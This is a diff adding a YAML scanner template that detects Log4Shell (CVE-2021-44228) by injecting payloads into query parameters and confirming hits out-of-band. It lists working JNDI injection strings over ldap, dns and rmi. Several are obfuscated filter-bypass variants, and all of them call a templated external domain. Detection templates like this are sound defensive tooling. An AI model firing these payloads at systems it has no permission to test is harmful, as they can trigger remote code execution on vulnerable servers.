@@ -1,0 +1,30 @@
+id: log4shell
+info:
+  name: "Log4Shell (CVE-2021-44228)"
+  severity: critical
+  description: "Detects Log4j JNDI injection with bypass variants and OOB confirmation"
+  tags: [cve, log4j, jndi, rce, java]
+  author: Wired
+
+inject: query_params
+detection: oob
+
+payloads:
+  - "${jndi:ldap://{{OOB_DOMAIN}}/akemi}"
+  - "${jndi:dns://{{OOB_DOMAIN}}/akemi}"
+  - "${jndi:rmi://{{OOB_DOMAIN}}/akemi}"
+  # Bypass variants
+  - "${${lower:j}ndi:${lower:l}dap://{{OOB_DOMAIN}}/akemi}"
+  - "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{OOB_DOMAIN}}/akemi}"
+  - "${j${::-n}di:ldap://{{OOB_DOMAIN}}/akemi}"
+  - "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{OOB_DOMAIN}}/akemi}"
+
+oob_payloads:
+  - "${jndi:ldap://{{OOB_DOMAIN}}/log4shell}"
+  - "${jndi:dns://{{OOB_DOMAIN}}/log4shell}"
+
+matchers:
+  body_patterns:
+    - "(?i)jndi"
+    - "(?i)log4j"
+    - "(?i)Lookup.*failed"
